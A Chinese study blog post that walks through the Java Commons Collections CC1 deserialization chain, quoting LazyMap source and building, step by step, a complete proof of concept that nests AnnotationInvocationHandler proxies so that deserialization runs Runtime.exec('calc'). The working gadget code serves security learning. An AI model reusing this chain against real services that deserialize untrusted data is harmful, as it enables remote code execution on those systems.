---
title: "正版cc1链学习"
date: "2026-11-01 21:30:08"
updated: "2026-11-01 21:30:08"
permalink: "2026/11/01/cc1-lazymap/"
categories: ["安全学习", "Java 反序列化"]
tags: ["Java", "反序列化", "CC1"]
description: "LazyMap 与 AnnotationInvocationHandler：逐步验证动态代理和两层 Handler 的对象关系。"
excerpt: "LazyMap 与 AnnotationInvocationHandler：逐步验证动态代理和两层 Handler 的对象关系。"
obsidian_source: "正版cc1链学习.md"
---

## 学习起点

依旧根据前人的经验，从transformer接口来入手，顺便就当复习了
transformer是一个接口，或者说是一个抽象类，里面有一个transfer方法，在实现这个类的时候要完成这个方法，我们可以看到有哪些具体的实现类
不再赘述


## LazyMap 与 transform 调用

这次链条的末尾还是invoketransformer，接着往下找，之前我们是走进了transformap，这次我们走进另一个调用它的地方，也就是lazymap

```java
/*  
 *  Licensed to the Apache Software Foundation (ASF) under one or more *  contributor license agreements.  See the NOTICE file distributed with *  this work for additional information regarding copyright ownership. *  The ASF licenses this file to You under the Apache License, Version 2.0 *  (the "License"); you may not use this file except in compliance with *  the License.  You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * *  Unless required by applicable law or agreed to in writing, software *  distributed under the License is distributed on an "AS IS" BASIS, *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. *  See the License for the specific language governing permissions and *  limitations under the License. */package org.apache.commons.collections.map;  
  
import java.io.IOException;  
import java.io.ObjectInputStream;  
import java.io.ObjectOutputStream;  
import java.io.Serializable;  
import java.util.Map;  
  
import org.apache.commons.collections.Factory;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.FactoryTransformer;  
  
/**  
 * Decorates another <code>Map</code> to create objects in the map on demand.  
 * <p>  
 * When the {@link #get(Object)} method is called with a key that does not  
 * exist in the map, the factory is used to create the object. The created * object will be added to the map using the requested key. * <p>  
 * For instance:  
 * <pre>  
 * Factory factory = new Factory() {  
 *     public Object create() { *         return new Date(); *     } * } * Map lazy = Lazy.map(new HashMap(), factory); * Object obj = lazy.get("NOW"); * </pre>  
 *  
 * After the above code is executed, <code>obj</code> will contain  
 * a new <code>Date</code> instance. Furthermore, that <code>Date</code>  
 * instance is mapped to the "NOW" key in the map.  
 * <p>  
 * <strong>Note that LazyMap is not synchronized and is not thread-safe.</strong>  
 * If you wish to use this map from multiple threads concurrently, you must use  
 * appropriate synchronization. The simplest approach is to wrap this map * using {@link java.util.Collections#synchronizedMap(Map)}. This class may throw   
 * exceptions when accessed by concurrent threads without synchronization.  
 * <p>  
 * This class is Serializable from Commons Collections 3.1.  
 * * @since Commons Collections 3.0  
 * @version $Revision: 646777 $ $Date: 2008-04-10 13:33:15 +0100 (Thu, 10 Apr 2008) $  
 ** @author Stephen Colebourne  
 * @author Paul Jack  
 */public class LazyMap  
        extends AbstractMapDecorator  
        implements Map, Serializable {  
  
    /** Serialization version */  
    private static final long serialVersionUID = 7990956402564206740L;  
  
    /** The factory to use to construct elements */  
    protected final Transformer factory;  
  
    /**  
     * Factory method to create a lazily instantiated map.     ** @param map  the map to decorate, must not be null  
     * @param factory  the factory to use, must not be null  
     * @throws IllegalArgumentException if map or factory is null  
     */    public static Map decorate(Map map, Factory factory) {  
        return new LazyMap(map, factory);  
    }  
  
    /**  
     * Factory method to create a lazily instantiated map.     ** @param map  the map to decorate, must not be null  
     * @param factory  the factory to use, must not be null  
     * @throws IllegalArgumentException if map or factory is null  
     */    public static Map decorate(Map map, Transformer factory) {  
        return new LazyMap(map, factory);  
    }  
  
    //-----------------------------------------------------------------------  
    /**  
     * Constructor that wraps (not copies).     ** @param map  the map to decorate, must not be null  
     * @param factory  the factory to use, must not be null  
     * @throws IllegalArgumentException if map or factory is null  
     */    protected LazyMap(Map map, Factory factory) {  
        super(map);  
        if (factory == null) {  
            throw new IllegalArgumentException("Factory must not be null");  
        }  
        this.factory = FactoryTransformer.getInstance(factory);  
    }  
  
    /**  
     * Constructor that wraps (not copies).     ** @param map  the map to decorate, must not be null  
     * @param factory  the factory to use, must not be null  
     * @throws IllegalArgumentException if map or factory is null  
     */    protected LazyMap(Map map, Transformer factory) {  
        super(map);  
        if (factory == null) {  
            throw new IllegalArgumentException("Factory must not be null");  
        }  
        this.factory = factory;  
    }  
  
    //-----------------------------------------------------------------------  
    /**  
     * Write the map out using a custom routine.     ** @param out  the output stream  
     * @throws IOException  
     * @since Commons Collections 3.1  
     */    private void writeObject(ObjectOutputStream out) throws IOException {  
        out.defaultWriteObject();  
        out.writeObject(map);  
    }  
  
    /**  
     * Read the map in using a custom routine.     ** @param in  the input stream  
     * @throws IOException  
     * @throws ClassNotFoundException  
     * @since Commons Collections 3.1  
     */    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {  
        in.defaultReadObject();  
        map = (Map) in.readObject();  
    }  
  
    //-----------------------------------------------------------------------  
    public Object get(Object key) {  
        // create value for key if key is not currently in the map  
        if (map.containsKey(key) == false) {  
            Object value = factory.transform(key);  
            map.put(key, value);  
            return value;  
        }  
        return map.get(key);  
    }  
  
    // no need to wrap keySet, entrySet or values as they are views of  
    // existing map entries - you can't do a map-style get on them.}
```
这个代码不长我们可以简单的看一下，它继承自AbstractMapDecorator，可以被序列化
这里接收两个参数一个是map另一个是transformer，构造方法受保护，用decorate来创建对象，这里有一个get方法，我们的transformer在这里被使用，这个方法是输入一个值检查key是否有对应的value，如果没有调用已经实现的transformer生成一个value然后进行保存返回。
我们只要输入的是invoke就可以了，我们先编写测试一下。

```java
public class cc1 {  
    public static void main(String[] args) throws Exception {  
        HashMap<Object, Object> oObjectHashMap = new HashMap<>();  
        ConstantTransformer nihao = new ConstantTransformer("nihao");  
        Map decorate = LazyMap.decorate(oObjectHashMap, nihao);  
        Object hello = decorate.get("hello");  
        System.out.println(hello);  
  
  
    };  
}
```
首先我们先测试一下这个lazymap的put方法，验证了我们的判断，接下来让它调用计算器
```java
public class cc1 {  
    public static void main(String[] args) throws Exception {  
        HashMap<Object, Object> oObjectHashMap = new HashMap<>();  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        Map decorate = LazyMap.decorate(oObjectHashMap, exec);  
        decorate.get(runtime);  
  
  
  
    };  
}
```
不出意外可以正常调用计算器，那么这一步就完成了接着往上走看是谁调用了get方法

## 追踪 AnnotationInvocationHandler

这里有非常多的内容调用了它，暂时我还没有看到怎么具体去寻找，我们作为上帝知道了是AnnotationInvocationHandler调用了
```java
public Object invoke(Object proxy, Method method, Object[] args) {  
    String member = method.getName();  
    Class<?>[] paramTypes = method.getParameterTypes();  
  
    // Handle Object and Annotation methods  
    if (member.equals("equals") && paramTypes.length == 1 &&  
        paramTypes[0] == Object.class)  
        return equalsImpl(args[0]);  
    if (paramTypes.length != 0)  
        throw new AssertionError("Too many parameters for an annotation method");  
  
    switch(member) {  
    case "toString":  
        return toStringImpl();  
    case "hashCode":  
        return hashCodeImpl();  
    case "annotationType":  
        return type;  
    }  
  
    // Handle annotation member accessors  
    Object result = memberValues.get(member);  
  
    if (result == null)  
        throw new IncompleteAnnotationException(type, member);  
  
    if (result instanceof ExceptionProxy)  
        throw ((ExceptionProxy) result).generateException();  
  
    if (result.getClass().isArray() && Array.getLength(result) != 0)  
        result = cloneArray(result);  
  
    return result;  
}
```
在这个invoke方法中
我们之前也了解这个类了，我们知道他自己写了readobject了，我们去看一看
这里的membervalues是我们可以控制的，那么我们就要控制他为lazymap去调用get方法
这个类是InvocationHandler的实现类，是一个动态代理，在invoke方法中会自动执行get方法，这就是我们利用的关键。

## 动态代理实验与排错

接下来我们来实现
```java
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
import org.example.LazyMapStudy;  
import java.lang.reflect.InvocationHandler;  
  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Proxy;  
import java.util.HashMap;  
import java.util.Map;  
  
public class cc1 {  
    public static void main(String[] args) throws Exception {  
        HashMap<Object, Object> oObjectHashMap = new HashMap<>();  
        Runtime runtime = Runtime.getRuntime();  
        InvokerTransformer exec = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});  
        Map decorate = LazyMap.decorate(oObjectHashMap, exec);  
//        decorate.get(runtime);  
        //因为AnnotationInvocationHandler是不能被直接创建的，因此我们使用反射的方法进行创建  
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);  
        declaredConstructor.setAccessible(true);  
        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);  
  
        Map proxyInstance = (Map) Proxy.newProxyInstance(  
                Map.class.getClassLoader(),  
                new Class[]{Map.class},  
                handler  
        );  
        proxyInstance.entrySet();  
  
  
  
    };  
}
```
我们进行编写验证发现报错，我们重新捋一下这个步骤。
我们创建了代理对象和处理器，代理对象把这个方法交给处理器，处理器使用自己的invoke方法，其中有这么一段代码Object result = memberValues.get(member);
我们传入的是lazymap类型的，因此调用lazymap的get方法，这里的member就是entryset，然后到get中过去执行，显然不能继续我们的利用链，我们要让get中的是runtime对象，因此我们要写一个chaintransformeer来让我们的链条可以继续下去
```java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
import org.example.LazyMapStudy;  
import java.lang.reflect.InvocationHandler;  
  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Proxy;  
import java.util.HashMap;  
import java.util.Map;  
  
public class cc1 {  
    public static void main(String[] args) throws Exception {  
        HashMap<Object, Object> oObjectHashMap = new HashMap<>();  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod",  
                        new Class[]{String.class, Class[].class},  
                        new Object[]{"getRuntime", new Class[0]}),  
                new InvokerTransformer("invoke",  
                        new Class[]{Object.class, Object[].class},  
                        new Object[]{null, new Object[0]}),  
                new InvokerTransformer("exec",  
                        new Class[]{String.class},  
                        new Object[]{"calc"})  
        };  
        Transformer chain = new ChainedTransformer(transformers);  
        Map decorate = LazyMap.decorate(oObjectHashMap, chain);  
//        decorate.get(runtime);  
        //因为AnnotationInvocationHandler是不能被直接创建的，因此我们使用反射的方法进行创建  
        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);  
        declaredConstructor.setAccessible(true);  
        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);  
  
        Map proxyInstance = (Map) Proxy.newProxyInstance(  
                Map.class.getClassLoader(),  
                new Class[]{Map.class},  
                handler  
        );  
        proxyInstance.entrySet();  
  
  
  
    };  
}
```
我们离成功已经很近了

## 构造两层 Handler

我们只需要解决一个问题，我们不执行entryset，让readobject里面去执行，如果我们直接进行序列化反序列化，我们发现首先回复handler，然后这里的membervalues是decorate，这也就意味着实际执行的是decorate.entryset，这很明显不会执行invoke方法，所以我们要想办法让他执行，我们让decorate变成代理就可以了，所以我们再增加一步
```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class cc1 {
    public static void main(String[] args) throws Exception {
        HashMap<Object, Object> oObjectHashMap = new HashMap<>();
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}),
                new ConstantTransformer(null)   // 末尾加 null，避免返回值强转 Set 报错
        };
        Transformer chain = new ChainedTransformer(transformers);
        Map decorate = LazyMap.decorate(oObjectHashMap, chain);

        Class<?> aClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);

        // 内层 handler：memberValues = LazyMap
        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);

        // 代理对象：handler 作为 InvocationHandler
        Map proxyInstance = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                handler
        );

        // 外层 handler：memberValues = proxyInstance，作为反序列化入口
        InvocationHandler hander1 = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyInstance);

        // ===== 序列化 =====
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(hander1);
        oos.close();

        System.out.println("序列化完成，字节数: " + barr.size());

        // ===== 反序列化（触发） =====
        System.out.println("开始反序列化...");
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        ois.readObject();
        ois.close();
    }
}
```
成功弹出计算器，今天的任务完成

## 学习回顾

我们再来梳理一下今天的学习内容

我们还是从invoketransformer入手，我们这次找到了lazymap，他其中的get方法可以调用transformer执行命令，接下来我们又发现handler的一个实现类，我们发现的invoke方法中是可以调用get的，同时他还有readobject，他会对传入的map进行entryset，我们要对传入的map是一个代理才可以进入invoke，还要保证invoke里面的是lazymap才可以让这个过程顺利执行，所以我们写了两层handler。这也是cc1中很精妙的一部分。

---

**本系列笔记：** [Java安全学习](/2026/11/01/java-security-urldns/) · [Java 反序列化漏洞：CommonsCollections1（CC1）学习笔记](/2026/11/01/cc1-study-notes/) · [cc1链学习](/2026/11/01/cc1-transformedmap/) · [正版cc1链学习](/2026/11/01/cc1-lazymap/) · [cc3链学习](/2026/11/01/cc3-classloading/) · [cc6链学习](/2026/11/01/cc6-study/)
